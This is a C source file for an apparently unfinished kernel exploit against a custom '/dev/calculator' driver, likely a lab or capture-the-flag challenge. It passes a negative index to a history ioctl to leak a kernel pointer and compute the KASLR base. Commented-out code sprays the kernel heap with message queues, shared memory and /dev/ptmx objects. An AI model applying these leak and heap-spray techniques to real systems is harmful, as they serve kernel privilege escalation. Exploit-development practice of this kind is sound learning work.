#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <unistd.h>

#include "calc.h"

#define PHYSMEM_KERNEL_BASE_OFFSET 0x777F81000000ULL
#define LEAK_OFFSET 0x83F040
#define SPRAY_SIZE 50

struct msgbuf {
  long mtype;
  char mtext[SPRAY_SIZE];
};

void hold() {
  puts("Press any key to continue...");
  getchar();
}

void slabinfo() {
  system("cat /proc/slabinfo | grep '^kmalloc'");
  hold();
}

// void spray_shm(int count, size_t size) {
//   for (int i = 0; i < count; i++) {
//     int shmid = shmget(IPC_PRIVATE, size, IPC_CREAT | 0666);
//     if (shmid == -1) {
//       perror("shmget");
//     }
//
//     // Присоединяем для увеличения счётчика ссылок
//     void *addr = shmat(shmid, NULL, 0);
//     if (addr == (void *)-1) {
//       perror("shmat");
//     }
//   }
// }

void main() {
  int fd = open("/dev/calculator", O_RDWR);

  // slabinfo();

  ioctl(fd, ALLOC_CMD, 0);
  // slabinfo();
  // ioctl(fd, FREE_CMD, 0);

  // slabinfo();

  // int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  // struct msgbuf *msg = malloc(sizeof(*msg));
  // msg->mtype = 1;
  // memset(&msg->mtext, 'A', SPRAY_SIZE);

  // puts("Spraying heap...");
  // for (int i = 0; i < 300; i++) {
  // msgsnd(qid, msg, SPRAY_SIZE, 0);
  // }

  // slabinfo();
  // spray_shm(300, 90);
  // for (int i = 0; i < 300; i++) {
  //   int fd2 = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  //   printf("fd opened %d\n", fd2);
  // }

  // slabinfo();

  puts("Leak kernel addr...");
  int64_t history_res;
  struct ioctl_history_arg history_arg;
  history_arg.out = &history_res;
  history_arg.index = -14;

  ioctl(fd, HISTORY_CMD, (void *)&history_arg);
  printf("kernel leak addr: %p\n", *history_arg.out);
  uint64_t kernel_base = *history_arg.out - LEAK_OFFSET;
  printf("kernel base: %p\n", kernel_base);

  // slabinfo();
}
